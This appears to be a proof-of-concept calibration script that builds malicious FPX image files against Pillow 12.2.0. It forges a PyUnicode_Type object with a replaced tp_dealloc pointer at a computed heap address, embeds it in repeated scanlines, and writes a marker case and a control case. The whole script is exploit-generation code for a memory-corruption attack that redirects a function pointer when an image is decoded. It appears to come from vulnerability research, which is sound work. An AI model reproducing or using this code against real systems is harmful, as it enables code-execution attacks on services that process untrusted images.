"""Regenerate the W7 image-only fake-type cases for the current heap layout.

Usage: python3 calibrate_file_case.py OUTDIR BUFFER_ADDRESS_HEX REALTYPE_BIN

BUFFER_ADDRESS_HEX is the value of state->buffer printed at the
ImagingJpegDecode breakpoint by probe_buffer.gdb; REALTYPE_BIN is that
probe's 416-byte dump of PyUnicode_Type. The committed case_file.fpx bakes
one host's address into the image, so a fresh host/layout needs a fresh case.
Only the forged tp_dealloc slot differs between the marker case and its
control. This script uses make_case.py, i.e. the same real OLE2/FPX generator
as the committed cases; PYTHONPATH must point at plain Pillow 12.2.0.
"""
import pathlib
import struct
import subprocess
import sys

HERE = pathlib.Path(__file__).resolve().parent
OUT = pathlib.Path(sys.argv[1])
BUF = int(sys.argv[2], 16)
REALTYPE = pathlib.Path(sys.argv[3]).read_bytes()
assert len(REALTYPE) == 416, len(REALTYPE)
FAKE = BUF + 720  # committed layout: 0xd32cc0 -> 0xd32f90
REAL_SLOT = struct.unpack("<Q", REALTYPE[48:56])[0]


def pattern(slot):
    t = bytearray(REALTYPE)
    t[48:56] = struct.pack("<Q", slot)
    p = bytearray(1024)
    p[184:192] = struct.pack("<Q", FAKE)
    # The type spans the end of one 1024-byte scanline and the start of the
    # next; make_case.py repeats this row eight times.
    p[720:1024] = t[:304]
    p[0:112] = t[304:]
    return bytes(p)


print(f"REAL_SLOT={REAL_SLOT:016x}")
for name, slot in (("case_cal1", 0x45E6E6), ("case_cal2", REAL_SLOT)):
    pat = pattern(slot)
    (OUT / (name + ".hex")).write_text(pat.hex() + "\n")
    subprocess.run(
        [sys.executable, "make_case.py", str(OUT / (name + ".fpx")),
         "256", "0xa5", "64", "64", pat.hex(), "8"],
        cwd=HERE, check=True,
    )
    print(f"{name}: fake={FAKE:#x} slot={slot:#x} path={OUT / (name + '.fpx')}")
